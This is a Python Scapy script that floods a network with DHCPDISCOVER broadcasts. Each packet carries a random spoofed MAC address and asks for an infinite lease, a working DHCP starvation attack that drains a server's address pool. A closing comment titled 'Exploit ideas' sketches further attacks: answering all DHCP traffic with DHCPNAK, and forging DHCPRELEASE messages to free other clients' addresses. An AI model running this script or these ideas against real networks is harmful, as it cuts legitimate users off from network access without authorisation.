#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import random
import string
import sys
import pdb
import time

conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)


def prepMAC(mac):
   mac = mac.translate(None, ':')
   mac = mac.decode('hex')
   return mac


def DHCPDISCOVER():
	mac = RandMAC()

	bootp = BOOTP(
		xid = random.randint(10000,0xffffffff), # Use random Transction ID
		secs = random.randint(0,0xffff), # Seconds elapsed
		chaddr = prepMAC(mac)) # Get random mac

	DHCPOptions = DHCP(options = [
		('message-type','discover'),
		('lease_time', 0xffffffff),  # Infinity (Not guaranteed)
		('client_id', str(random.randint(0,0xffff))),
		("requested_addr","10.0.0." + str(random.randint(3,255))), #doesn't really matter
		'end'])

	discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255",ttl=128)/UDP(sport=68,dport=67)/bootp

	while len(discover/DHCPOptions) < 342:
		DHCPOptions[DHCP].options.append('pad')

	discover = discover/DHCPOptions

	sendp(discover, verbose=0)
	print "."
	return



def main():
   if len(sys.argv)!=2:
      print "\n\tUsage: ", sys.argv[0], "DISCOVERY_COUNT\n"
      return

   for count in range(int(sys.argv[1])):
      DHCPDISCOVER()


main()


""" PACKET SPECS


    Option                     DHCPDISCOVER  DHCPREQUEST      DHCPDECLINE,
                                                            DHCPRELEASE
  ------                     ------------  -----------      -----------

  Requested IP address       MAY           MUST NOT         MUST NOT
  IP address lease time      MAY           MAY              MUST NOT
  Use 'file'/'sname' fields  MAY           MAY              MAY
  DHCP message type          DHCPDISCOVER  DHCPREQUEST      DHCPDECLINE/
                                                            DHCPRELEASE
  Client identifier          MAY           MAY              MAY
  Class identifier           SHOULD        SHOULD           MUST NOT
  Server identifier          MUST NOT      MUST (after      MUST
                                           DHCPDISCOVER),
                                           MUST NOT (when
                                           renewing)
  Parameter request list     MAY           MAY              MUST NOT
  Maximum message size       MAY           MAY              MUST NOT
  Message                    SHOULD NOT    SHOULD NOT       SHOULD
  Site-specific              MAY           MAY              MUST NOT
  All others                 MUST NOT      MUST NOT         MUST NOT
"""


""" Exploit ideas

Reply to all DHCP traffic with DHCPNAK
	--> "If the client receives a DHCPNAK message, the client restarts the configuration process."

Release others IPs
	--> "The client identifies the lease to be released with its 'client identifier', or 'chaddr' and network address in the DHCPRELEASE message.
	 If the client used a 'client identifier' when it obtained the lease, it MUST use the same 'client identifier' in the DHCPRELEASE message."
		--> Client Identifier may be an issue if we do not know it.


"""
